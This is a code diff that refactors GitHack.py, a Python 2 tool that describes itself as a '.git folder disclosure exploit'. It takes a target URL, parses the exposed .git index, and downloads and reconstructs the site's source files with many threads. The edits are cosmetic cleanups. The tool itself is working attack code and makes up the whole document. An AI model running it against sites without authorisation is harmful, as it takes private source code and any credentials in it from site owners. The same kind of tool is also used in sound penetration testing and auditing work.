@@ -15,7 +15,6 @@ from lib.parser import parse
 
 if len(sys.argv) == 1:
     msg = """
-
 A `.git` folder disclosure exploit. By LiJieJie
 
 Usage: GitHack.py http://www.target.com/.git/
@@ -42,26 +41,30 @@ class Scanner(object):
                 self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
                 try:
                     print entry['name']
-                except:
+                except Exception as e:
                     pass
         self.lock = threading.Lock()
         self.thread_count = 20
         self.STOP_ME = False
 
-    def _request_data(self, url):
+    @staticmethod
+    def _request_data(url):
         request = urllib2.Request(url, None, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
         return urllib2.urlopen(request).read()
 
     def _print(self, msg):
         self.lock.acquire()
-        print msg
+        try:
+            print msg
+        except Exception as e:
+            pass
         self.lock.release()
 
     def get_back_file(self):
         while not self.STOP_ME:
             try:
                 sha1, file_name = self.queue.get(timeout=0.5)
-            except:
+            except Exception as e:
                 break
             for i in range(3):
                 try:
@@ -71,20 +74,20 @@ class Scanner(object):
                         data = zlib.decompress(data)
                     except:
                         self._print('[Error] Fail to decompress %s' % file_name)
-                    data = re.sub('blob \d+\00', '', data)
-                    target_dir = os.path.join(self.domain, os.path.dirname(file_name) )
+                    data = re.sub(r'blob \d+\00', '', data)
+                    target_dir = os.path.join(self.domain, os.path.dirname(file_name))
                     if target_dir and not os.path.exists(target_dir):
                         os.makedirs(target_dir)
-                    with open( os.path.join(self.domain, file_name) , 'wb') as f:
+                    with open(os.path.join(self.domain, file_name), 'wb') as f:
                         f.write(data)
                     self._print('[OK] %s' % file_name)
                     break
                 except urllib2.HTTPError, e:
-                    if str(e).find('HTTP Error 404') >=0:
+                    if str(e).find('HTTP Error 404') >= 0:
                         self._print('[File not found] %s' % file_name)
                         break
-                except Exception, e:
-                    self._print('[Error] %s' % e)
+                except Exception as e:
+                    self._print('[Error] %s' % str(e))
         self.exit_thread()
 
     def exit_thread(self):
@@ -98,12 +101,13 @@ class Scanner(object):
             t.start()
 
 
-s = Scanner()
-s.scan()
-try:
-    while s.thread_count > 0:
-        time.sleep(0.1)
-except KeyboardInterrupt, e:
-    s.STOP_ME = True
-    time.sleep(1.0)
-    print 'User Aborted.'
+if __name__ == '__main__':
+    s = Scanner()
+    s.scan()
+    try:
+        while s.thread_count > 0:
+            time.sleep(0.1)
+    except KeyboardInterrupt, e:
+        s.STOP_ME = True
+        time.sleep(1.0)
+        print 'User Aborted.'
